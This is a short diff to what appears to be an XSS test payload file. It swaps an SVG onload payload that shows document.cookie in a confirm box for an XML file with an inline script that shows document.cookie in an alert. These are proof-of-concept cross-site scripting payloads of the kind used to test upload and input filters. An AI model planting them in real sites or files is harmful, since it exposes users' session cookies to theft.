@@ -1,1 +1,5 @@
-<svg xmlns="http://www.w3.org/2000/svg"><onload confirm=(document.cookie)></svg>
+<?xml version="1.0" standalone="no"?>
+<script type="text/javascript">
+alert(document.cookie);
+</script>
+</xml>
